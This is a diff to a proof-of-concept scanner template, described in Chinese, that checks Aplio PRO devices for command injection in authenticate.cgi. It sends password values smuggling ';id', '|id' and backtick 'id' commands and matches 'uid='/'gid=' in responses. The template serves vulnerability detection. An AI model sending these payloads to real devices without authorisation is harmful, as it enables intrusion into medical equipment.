@@ -1,6 +1,6 @@
 [info]
-author = "AVE"
-description = "向 Aplio PRO 设备的 /cgi-bin/authenticate.cgi 发送包含 shell 元字符的 password 参数，验证是否存在命令注入漏洞。若返回中包含命令执行结果（如 id 命令输出），则判定存在漏洞。"
+author = "ave"
+description = "向 Aplio PRO 设备的 authenticate.cgi 发送包含 shell 元字符的 password 参数，验证是否存在命令注入漏洞。若注入命令（如 id）的输出回显在响应体中，则判定存在漏洞。"
 id = "POC-AVE-2000-1014"
 name = "Aplio PRO authenticate.cgi 远程命令执行 PoC"
 severity = "high"
@@ -14,26 +14,26 @@ vuln_id = [
 logic = "any"
 
 [[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/cgi-bin/authenticate.cgi?password=%3Bid"
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/authenticate.cgi"
 protocol = "http"
+
+[poc.requests.body]
+content = "password=test%3Bid"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["uid="]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/cgi-bin/authenticate.cgi?password=%7Cid"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = ["uid="]
+words = [
+    "uid=",
+    "gid=",
+]
 
 [[poc.requests]]
 method = "POST"
@@ -41,11 +41,40 @@ path = "/{{BaseURL}}/cgi-bin/authenticate.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "password=%3Bid"
+content = "password=test%7Cid"
 type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["uid="]
+words = [
+    "uid=",
+    "gid=",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/authenticate.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "password=test%60id%60"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
